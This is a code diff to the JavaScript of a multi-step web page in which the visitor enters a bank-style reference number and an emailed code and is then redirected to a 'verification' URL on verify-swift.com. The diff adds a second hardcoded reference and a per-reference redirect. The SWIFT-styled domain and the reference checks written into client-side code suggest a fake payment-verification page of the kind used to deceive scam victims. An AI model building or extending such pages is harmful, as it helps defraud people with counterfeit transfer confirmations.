@@ -345,11 +345,12 @@
 </div>
 
 <script>
-// JavaScript kodu eyni qalır, sadəcə step indicator əlavə edirik
+// JavaScript kodu yeniləndi - iki referans nömrəsi əlavə edildi
 let currentStep = 1;
 let verificationCode = '';
 let codeExpiry;
 let userEmail = '';
+let redirectUrl = '';
 
 function showStep(step) {
     document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
@@ -389,6 +390,10 @@ document.getElementById('step1Next').addEventListener('click', () => {
     }
 
     if (ref === 'COBA300525CH59279') {
+        redirectUrl = 'https://verify-swift.com/verification-cob.html';
+        showStep(2);
+    } else if (ref === 'COBA310625CH68412') {
+        redirectUrl = 'https://verify-swift.com/verification-cob-abnab';
         showStep(2);
     } else {
         refError.textContent = 'Invalid reference number. Please check and try again.';
@@ -470,7 +475,7 @@ document.getElementById('verifyCode').addEventListener('click', () => {
         document.getElementById('redirectLoading').style.display = 'block';
         
         setTimeout(() => {
-            window.location.href = 'https://verify-swift.com/verification-cob.html';
+            window.location.href = redirectUrl;
         }, 2000);
         
     } else {
